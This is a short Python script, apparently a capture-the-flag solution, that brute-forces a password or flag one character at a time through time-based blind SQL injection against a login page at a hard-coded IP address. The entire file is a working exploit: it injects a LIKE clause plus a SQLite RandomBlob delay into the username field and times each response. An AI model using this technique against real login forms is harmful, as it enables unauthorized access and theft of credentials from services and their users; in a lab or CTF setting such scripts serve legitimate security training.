import requests
import time

url = 'http://103.24.246.118:5551/blind/index.php'

matKhauHienTai = 'TTHL{'
kyTuHienTai = ''

while kyTuHienTai != '}':
    for i in range(33, 127):
        # print(i, ' => ', chr(i))
        kyTuHienTai = chr(i)
        if(kyTuHienTai == '%'):
            continue
        matKhauTam = matKhauHienTai + kyTuHienTai
        # root' and RANDOMbLOB(250000000/2) --
        myobj = {
            'username': f"root' AND PASSWORD LIKE '{matKhauTam}%' and RandomBlob(500000000/2) --",
            "login": "Submit"
        }
        start = time.time()
        x = requests.post(url, data  = myobj)
        end = time.time()
        if(end-start >= 1.5):
            matKhauHienTai = matKhauTam
            print(matKhauHienTai)
            break
        if(i == 126):
            print('xong')
            break